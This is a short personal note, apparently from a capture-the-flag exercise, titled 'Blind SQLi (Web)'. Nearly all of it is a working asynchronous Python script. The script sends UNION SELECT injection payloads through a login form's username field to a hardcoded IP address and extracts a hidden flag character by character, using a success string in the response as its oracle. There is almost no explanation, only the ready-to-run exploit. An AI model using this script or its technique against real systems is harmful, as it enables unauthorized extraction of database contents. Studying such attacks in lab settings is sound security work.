---
title: "Blind SQLi (Web)"
category: "web"
subcategory: "sqli"
type: "technique"
tags: ["my-notes", "personal", "sqli", "union-select", "blind-sqli", "web"]
summary: "Personal note: Blind SQLi (Web)."
source:
  name: "Personal notes"
origin_path: "Web/Blind SQLi.md"
---

#sqli
```python
import asyncio
import aiohttp

async def fetch_char(session, url, i, char):
    payload = {
        'username': f"admin' UNION SELECT flag,2,2 from flag WHERE substr(flag,{i},1)='{char}'--",
        'password': 'admin'
    }
    async with session.post(url, data=payload) as response:
        text = await response.text()
        if "Here is the final take" in text:
            return char
    return None

async def extract_flag():
    flag = ""
    url = 'http://51.12.211.165:8200/admin'
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_!@$*"
    
    async with aiohttp.ClientSession() as session:
        for i in range(1, 100):
            tasks = [fetch_char(session, url, i, char) for char in chars]
            char_found = False
            for future in asyncio.as_completed(tasks):
                char = await future
                if char:
                    flag += char
                    print(f"Extracted so far: {flag}")
                    char_found = True
                    break
            if not char_found:
                print(f"Full flag extracted: {flag}")
                break

if __name__ == "__main__":
    asyncio.run(extract_flag())
```

---

*From your own notes: `Web/Blind SQLi.md`*
